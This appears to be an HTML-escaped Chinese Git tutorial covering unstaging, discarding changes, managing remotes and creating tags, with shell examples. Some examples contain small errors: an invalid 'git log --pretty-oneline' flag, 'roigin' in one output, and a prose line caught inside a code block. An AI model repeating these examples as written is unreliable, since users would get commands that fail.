&lt;h3 id=&quot;取消暂存的文件&quot;&gt;取消暂存的文件&lt;/h3&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git reset HEAD &amp;lt;file&amp;gt;...&lt;/code&gt; 来取消暂存某个文件：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

Changes to be committed:

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git reset HEAD &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



    renamed:    README.md -&amp;gt; README

    modified:   CONTRIBUTING.md

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git reset HEAD CONTRIBUTING.md

Unstaged changes after reset:

M CONTRIBUTING.md

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

Changes to be committed:

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git reset HEAD &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



    renamed:    README.md -&amp;gt; README



Changes not staged &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commit:

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git add &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to update what will be committed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git checkout -- &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to discard changes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;working directory&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



    modified:   CONTRIBUTING.md

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;撤消对文件的修改&quot;&gt;撤消对文件的修改&lt;/h3&gt;

&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout -- &amp;lt;file&amp;gt;...&lt;/code&gt; 来把文件还原到上次提交时的样子。如还原 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CONTRIBUTING.md&lt;/code&gt; 文件：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git checkout &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; CONTRIBUTING.md

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git status

On branch master

Changes to be committed:

  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s2&quot;&gt;&quot;git reset HEAD &amp;lt;file&amp;gt;...&quot;&lt;/span&gt; to unstage&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;



    renamed:    README.md -&amp;gt; README

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git checkout -- [file]&lt;/code&gt; 是一个危险的命令，Git 只是拷贝了另一个文件来覆盖它，所以对它做的修改历史都会消失。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;远程仓库的使用&quot;&gt;远程仓库的使用&lt;/h2&gt;
&lt;h3 id=&quot;查看远程仓库&quot;&gt;查看远程仓库&lt;/h3&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote&lt;/code&gt; 命令查看已经配置了的远程仓库服务器。如果你试着在自己克隆的项目目录运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote&lt;/code&gt; 那么至少能看到 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt;：这是 Git 给克隆的仓库服务器的默认名字：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/schacon/ticgit
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;ticgit
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote

使用 &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;git remote &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; 会显示远程仓库的 Git 简写以及对应的 URL。

&lt;span class=&quot;sb&quot;&gt;```&lt;/span&gt;bash
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

origin https://github.com/schacon/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

origin https://github.com/schacon/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;如果远程仓库不止一个（与多个协作者合作的仓库），那么输出将会像是这样：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;grit
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

bakkdoor  https://github.com/bakkdoor/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

bakkdoor  https://github.com/bakkdoor/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

cho45     https://github.com/cho45/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

cho45     https://github.com/cho45/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

defunkt   https://github.com/defunkt/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

defunkt   https://github.com/defunkt/grit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

koke      git://github.com/koke/grit.git &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

koke      git://github.com/koke/grit.git &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

origin    git@github.com:mojombo/grit.git &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

origin    git@github.com:mojombo/grit.git &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我们可以拉取任何一个用户的贡献。&lt;/p&gt;

&lt;h3 id=&quot;添加远程仓库&quot;&gt;添加远程仓库&lt;/h3&gt;
&lt;p&gt;运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote add &amp;lt;shortname&amp;gt; &amp;lt;url&amp;gt;&lt;/code&gt; 添加一个远程仓库，同时指定一个简写：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote

origin

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote add pb https://github.com/paulboone/ticgit
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

origin https://github.com/schacon/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
origin https://github.com/schacon/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
pb https://github.com/paulboone/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;fetch&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
pb https://github.com/paulboone/ticgit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;push&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;以后就可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb&lt;/code&gt; 来代替整个 URL。如想要拉取 paulboone 的仓库，只需要输入：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git fetch pb
remote: Counting objects: 43, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;36/36&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
remote: Total 43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 10&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 31 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Unpacking objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;43/43&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
From https://github.com/paulboone/ticgit
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new branch]      master     -&amp;gt; pb/master
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;new branch]      ticgit     -&amp;gt; pb/ticgit
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后就可以在本地通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb/master&lt;/code&gt; 访问到了。&lt;/p&gt;

&lt;h3 id=&quot;从远程仓库中抓取与拉取&quot;&gt;从远程仓库中抓取与拉取&lt;/h3&gt;
&lt;p&gt;如上面所见，从远程仓库中获得数据，可以执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch [remote-name]&lt;/code&gt; 命令。这个命令会访问远程仓库，拉取本地没有的数据。执行完成后，可以随时合并或查看。&lt;/p&gt;

&lt;p&gt;如果是使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 命令克隆了一个仓库，命令会自动将其添加为远程仓库并以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt; 为简写。所以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch origin&lt;/code&gt; 会抓取 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 后（或上一次 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch&lt;/code&gt; 后新推送的所有工作。&lt;/p&gt;

&lt;p&gt;需要注意的是 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git fetch&lt;/code&gt; 命令只会将数据拉取到本地，但是不会自动合并或修改当前分支，需要你自己准备好的时候手动合并。&lt;/p&gt;

&lt;p&gt;如果你需要从默认远程分支上抓取并合并，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; 命令。该命令自动抓取默认的远程仓库分支，并尝试合并到当前本地分支。一般情况下，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git clone&lt;/code&gt; 命令会自动设置本地 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支跟踪并克隆远程仓库的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支（或其他名字的默认分支）。&lt;/p&gt;

&lt;h3 id=&quot;推送到远程仓库&quot;&gt;推送到远程仓库&lt;/h3&gt;
&lt;p&gt;当你想要分享项目时，必须将其推送到上游，使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push [remote-name] [branch-name]&lt;/code&gt; 命令来操作。比如当你想要将本地的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支推送到远程 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt; 服务器时（这一般是克隆时命令自动设置的远程服务器名字），那么运行如下代码：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git push origin master
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;只有你拥有远程仓库的写入权限，并且之前没有人推送过时，该命令才能生效。如果在你克隆后，其他人先推送了项目到上游，此时你需要先将他们的工作拉取下来并合并到你的工作后，才能推送成功。&lt;/p&gt;

&lt;h3 id=&quot;查看远程仓库-1&quot;&gt;查看远程仓库&lt;/h3&gt;
&lt;p&gt;如果想要查看远程仓库的更多信息，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote show [remote-name]&lt;/code&gt; 命令。如查看 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;origin&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote show origin
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; remote origin
  Fetch URL: https://github.com/schacon/ticgit
    Push  URL: https://github.com/schacon/ticgit
    HEAD branch: master
    Remote branches:
      master                               tracked
        dev-branch                           tracked
      Local branch configured &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'git pull'&lt;/span&gt;:
      master merges with remote master
      Local ref configured &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'git push'&lt;/span&gt;:
      master pushes to master &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;up to &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令会列出远程仓库的 URL 和跟踪分支的信息。该输出表示你正处于 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HEAD branch: master&lt;/code&gt;），并且如果你运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt;，就会抓取所有远程引用，然后将远程 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支合并到本地 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master&lt;/code&gt; 分支（&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;master merges with remote master&lt;/code&gt;）。&lt;/p&gt;

&lt;p&gt;如果是 Git 的重度使用着，将会通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote show&lt;/code&gt; 看到更多信息：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote show origin
&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; remote origin
  URL: https://github.com/my-org/complex-project
    Fetch URL: https://github.com/my-org/complex-project
    Push  URL: https://github.com/my-org/complex-project
    HEAD branch: master
    Remote branches:
      master                           tracked
        dev-branch                       tracked
        markdown-strip                   tracked
        issue-43                         new &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;next fetch will store &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;remotes/origin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        issue-45                         new &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;next fetch will store &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;remotes/origin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        refs/remotes/origin/issue-11     stale &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'git remote prune'&lt;/span&gt; to remove&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
      Local branches configured &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'git pull'&lt;/span&gt;:
      dev-branch merges with remote dev-branch
        master     merges with remote master
      Local refs configured &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'git push'&lt;/span&gt;:
      dev-branch                     pushes to dev-branch                     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;up to &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        markdown-strip                 pushes to markdown-strip                 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;up to &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        master                         pushes to master                         &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;up to &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里输出显示了当你在特定分支上执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git push&lt;/code&gt; 时会将本地项目推送到哪个远程分支，还列出了哪些分支不在本地，哪些远程分支已经从服务器删除，还有当你执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git pull&lt;/code&gt; 时哪些分支会自动合并。&lt;/p&gt;

&lt;h3 id=&quot;远程仓库的移除与重命名&quot;&gt;远程仓库的移除与重命名&lt;/h3&gt;
&lt;p&gt;重命名远程引用，可以通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote rename&lt;/code&gt; 修改。例如将上面的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb&lt;/code&gt; 重命名为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paul&lt;/code&gt; 可以通过下面命令实现：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote rename pb paul
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote
origin
paul
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;需要注意的是这也同样会修改远程分支中的名字，那些之前引用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pb/master&lt;/code&gt; 的现在会引用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;paul/master&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;如果需要移除一个远程仓库，可以使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git remote rm&lt;/code&gt; 命令：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote &lt;span class=&quot;nb&quot;&gt;rm &lt;/span&gt;paul
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git remote
roigin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;打标签&quot;&gt;打标签&lt;/h2&gt;
&lt;h3 id=&quot;列出标签&quot;&gt;列出标签&lt;/h3&gt;
&lt;p&gt;使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git tag&lt;/code&gt; 命令列出标签：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag
v0.1
v1.3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;该命令默认以字幕顺序列出标签。&lt;/p&gt;

&lt;p&gt;你也可以使用特定的模式查找标签，如查看 Git 自身源代码仓库的 1.8.5 系列，可以运行：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'v1.8.5*'&lt;/span&gt;
v1.8.5
v1.8.5-rc0
v1.8.5-rc1
v1.8.5-rc2
v1.8.5-rc3
v1.8.5.1
v1.8.5.2
v1.8.5.3
v1.8.5.4
v1.8.5.5

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;创建标签&quot;&gt;创建标签&lt;/h3&gt;
&lt;p&gt;Git 使用轻量标签（lightweight）与附注标签（annotated）两种标签。&lt;/p&gt;

&lt;p&gt;轻量标签很像一个不会改变的分支 - 它只是一个特定提交的引用。&lt;/p&gt;

&lt;p&gt;附注标签是存储在 Git 数据库中的一个完整对象。他们是可以被校验的，包括：打标签者的名字、电子邮件地址、日期时间、标签信息，并且可以使用 GNU Privace Guard（GPG）签名与验证。通常建议创建附注标签，这样就可以拥有以上所有信息；但如果想要临时标签，或者不想保存这些信息，轻量标签也是可以的。&lt;/p&gt;

&lt;h4 id=&quot;附注标签&quot;&gt;附注标签&lt;/h4&gt;
&lt;p&gt;在运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git tag&lt;/code&gt; 时指定 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; 选项，来创建一个附注标签：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; v1.4 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'my version 1.4'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag
v1.4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-a&lt;/code&gt; 选项指定了一条需要存储在标签中的信息，如果没有指定信息，Git 会通过运行编辑器来要求你输入信息。&lt;/p&gt;

&lt;p&gt;通过使用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git show&lt;/code&gt; 命令可以看到标签信息和对应的提交信息：&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git show v1.4
Tagger: Ben Straub &amp;lt;ben@straub.cc&amp;gt;
Date:   Sat May 3 20:19:12 2014 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

my version 1.4

commit ca82a6dff817ec66f44342007202690a93763949
Author: Scott Chacon &amp;lt;schacon@gee-mail.com&amp;gt;
Date:   Mon Mar 17 21:52:11 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    changed the version number
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;轻量标签&quot;&gt;轻量标签&lt;/h4&gt;
&lt;p&gt;轻量标签本质上是将提交校验和存储到一个文件中 - 没有保存任何其他信息。创建轻量标签只需要提供标签名字：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag v1.4-lw
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag
v1.4
v1.4-lw
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这是如果在标签上运行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git show&lt;/code&gt; 将不会看到额外的信息。命令只显示提交信息：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git show v1.4-lw
commit ca82a6dff817ec66f44342007202690a93763949
Author: Scott Chacon &amp;lt;schacon@gee-mail.com&amp;gt;
Date:   Mon Mar 17 21:52:11 2008 &lt;span class=&quot;nt&quot;&gt;-0700&lt;/span&gt;

    changed the version number
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;后期打标签&quot;&gt;后期打标签&lt;/h3&gt;
&lt;p&gt;通过指定提交的校验和，来对历史提交进行打标签。&lt;/p&gt;

&lt;p&gt;比如一个这样的提交历史：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git log &lt;span class=&quot;nt&quot;&gt;--pretty-oneline&lt;/span&gt;
15027957951b64cf874c3557a0f3547bd83b3ff6 Merge branch &lt;span class=&quot;s1&quot;&gt;'experiment'&lt;/span&gt;
a6b4c97498bd301d84096da251c98a07c7723e65 beginning write support
0d52aaab4479697da7686c15f77a3d64d9165190 one more thing
9fceb02d0ae598e95dc970b74767f19372d61af8 updated rakefile
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;假设在 v1.2 时忘记打标签，也就是在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;updated rakefile&lt;/code&gt; 提交，可以在命令末尾添加校验和（或部分校验和）：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git tag &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; v1.2 9fceb02
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;通过 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git show v1.2&lt;/code&gt; 可以看到已经打上了标签：&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git show v1.2
tag v1.2
Tagger: Scott Chacon &amp;lt;schacon@gee-mail.com&amp;gt;
